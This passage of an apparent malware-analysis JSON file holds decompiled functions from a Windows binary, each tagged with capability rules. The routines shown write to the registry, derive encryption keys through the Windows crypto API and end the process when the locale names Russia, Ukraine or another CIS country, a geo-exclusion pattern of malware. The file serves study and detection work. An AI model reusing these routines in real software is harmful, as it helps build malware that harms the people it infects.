(*_sym.imp.ADVAPI32.dll_RegSetValueExA)(hKey, puVar2, 0, 1, arg_8h_00, cbData);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    fcn.0040a3ea(arg_8h_00);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    return;\n}\n",
        "token_count": 498
    },
    "00407c7d": {
        "rules": [
            "hash data using SHA1/569f5a119d93492db8a59d47f1ccb3c0"
        ],
        "decompiled_code": "\nvoid fcn.00407c7d(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint arg_8h;\n    uint *var_20h;\n    int32_t dwDataLen;\n    uint32_t var_ch;\n    uint32_t var_4h;\n    \n    pcVar1 = _sym.imp.ADVAPI32.dll_CryptAcquireContextA;\n    var_4h = *0x416084 ^ &stack0xfffffffc;\n    arg_8h = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextA)(0x417b04, 0x41490c, 0, 1, 0);\n    if (iVar2 != 0) goto code_r0x00407cc6;\n    iVar2 = (*pcVar1)(0x417b04, 0x41490c, 0, 1, 8);\n    if (iVar2 != 0) goto code_r0x00407cc6;\n    uVar6 = 0x8235;\n    while( true ) {\n        while( true ) {\n            while( true ) {\n                (*_sym.imp.KERNEL32.dll_ExitProcess)(uVar6);\ncode_r0x00407cc6:\n                fcn.00403597(\"sosorin :)\");\n                iVar2 = fcn.004083ed(dwDataLen);\n                puVar3 = var_20h;\n                if (var_ch < 0x10) {\n                    puVar3 = &var_20h;\n                }\n                puVar3 = puVar3 + dwDataLen;\n                puVar4 = var_20h;\n                if (var_ch < 0x10) {\n                    puVar4 = &var_20h;\n                }\n                if (puVar4 != puVar3) {\n                    iVar5 = iVar2 - puVar4;\n                    do {\n                        *(iVar5 + puVar4) = *puVar4;\n                        puVar4 = puVar4 + 1;\n                    } while (puVar4 != puVar3);\n                }\n                iVar5 = (*_sym.imp.ADVAPI32.dll_CryptCreateHash)(*0x417b04, 0x8004, 0, 0, 0x417b08);\n                if (iVar5 != 0) break;\n                uVar6 = 1;\n            }\n            iVar5 = (*_sym.imp.ADVAPI32.dll_CryptHashData)(*0x417b08, iVar2, dwDataLen, 0);\n            if (iVar5 != 0) break;\n            uVar6 = 2;\n        }\n        iVar5 = (*_sym.imp.ADVAPI32.dll_CryptDeriveKey)(*0x417b04, 0x6801, *0x417b08, 1, 0x417b00);\n        if (iVar5 != 0) break;\n        uVar6 = 3;\n    }\n    fcn.0040a3ea(iVar2);\n    fcn.0040135c(1);\n    fcn.004083f8(arg_8h);\n    return;\n}\n",
        "token_count": 714
    },
    "0040437a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040437a(char **arg_8h, char *arg_ch, char *arg_10h)\n\n{\n    char *pcVar1;\n    char *in_EAX;\n    \n    if (arg_ch != arg_10h) {\n        do {\n            if (*arg_ch == *in_EAX) break;\n            arg_ch = arg_ch + 1;\n        } while (arg_ch != arg_10h);\n    }\n    pcVar1 = arg_ch;\n    if (arg_ch == arg_10h) {\n        *arg_8h = arg_ch;\n        return;\n    }\n    while (pcVar1 = pcVar1 + 1,  pcVar1 != arg_10h) {\n        if (*pcVar1 != *in_EAX) {\n            *arg_ch = *pcVar1;\n            arg_ch = arg_ch + 1;\n        }\n    }\n    *arg_8h = arg_ch;\n    return;\n}\n",
        "token_count": 209
    },
    "004083ed": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.004083ed(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    code *apcStack20 [3];\n    char *pcStack8;\n    \n    do {\n        iVar2 = fcn.0040b1c8(param_1);\n        if (iVar2 != 0) {\n            return;\n        }\n        iVar2 = fcn.0040b427(param_1);\n    } while (iVar2 != 0);\n    if ((*0x416e2c & 1) == 0) {\n        *0x416e2c = *0x416e2c | 1;\n        pcStack8 = \"bad allocation\";\n        fcn.004088b6(&pcStack8);\n        *0x416e20 = vtable.std::bad_alloc.0;\n        fcn.00408894(0x41001f);\n    }\n    fcn.004089cc(0x416e20);\n    apcStack20[0] = vtable.std::bad_alloc.0;\n    fcn.0040a8dd(apcStack20, 0x414fb0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 272
    },
    "0040b316": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040b316(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040af40(0x414e00, 0xc);\n    fcn.0040c927(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x4171a8;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x4171a4;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x0040b35a;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.0040b12f(arg_8h_00);\ncode_r0x0040b35a:\n        fcn.0040b12f(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0040b37d();\n    fcn.0040af85();\n    return;\n}\n",
        "token_count": 404
    },
    "004013ef": {
        "rules": [
            "create new key via CryptAcquireContext",
            "terminate process"
        ],
        "decompiled_code": "\nvoid fcn.004013ef(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    \n    pcVar1 = _sym.imp.ADVAPI32.dll_CryptAcquireContextA;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextA)(0x417aec, 0, 0, 0x18, 0);\n    if (iVar2 == 0) {\n        iVar2 = (*pcVar1)(0x417aec, 0, 0, 0x18, 8);\n        if (iVar2 == 0) {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n        }\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "00405558": {
        "rules": [
            "terminate process"
        ],
        "decompiled_code": "\nvoid fcn.00405558(void)\n\n{\n    code *pcVar1;\n    char cVar2;\n    \n    cVar2 = fcn.004049c9(\"Russia\");\n    if (cVar2 == '\\0') {\n        cVar2 = fcn.004049c9(\"Belarus\");\n        if (cVar2 == '\\0') {\n            cVar2 = fcn.004049c9(\"Kazakhstan\");\n            if (cVar2 == '\\0') {\n                cVar2 = fcn.004049c9(\"Tajikistan\");\n                if (cVar2 == '\\0') {\n                    cVar2 = fcn.004049c9(\"Ukraine\");\n                    if (cVar2 == '\\0') {\n                        cVar2 = fcn.004049c9(\"Azerbaijan\");\n                        if (cVar2 == '\\0') {\n                            cVar2 = fcn.004049c9(\"Armenia\");\n                            if (cVar2 == '\\0') {\n                                cVar2 = fcn.004049c9(\"Kyrgyzstan\");\n                                if (cVar2 == '\\0') {\n                                    *0x417b0c = fcn.004049c9(\"Moldova\");\n                                    if (*0x417b0c == '\\0') {\n                                        return;\n                                    }\n                                }\n                            }\n                        }\n                    }\n                }\n            }\n        }\n    }\n    *0x417b0c = 1;\n    (*_sym.imp.KERNEL32.dll_ExitProcess)(0x29a);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 352
    },
    "004081b5": {
        "rules": [
            "get common file path"
        ],
        "decompiled_code": "\nvoid fcn.004081b5(void)\n\n{\n    uint *arg_8h;\n    uint hwndOwner;\n    uint32_t var_4h;\n    \n    var_4h = *0x416084 ^ &stack0xfffffffc;\n    (*_sym.imp.SHELL32.dll_SHGetFolderPathW)(0, 0x28, 0, 0, &hwndOwner);\n    arg_8h = &hwndOwner;\n    fcn.00403779(arg_8h);\n    fcn.004083f8(arg_8h);\n    return;\n}\n",
        "token_count": 123
    }
}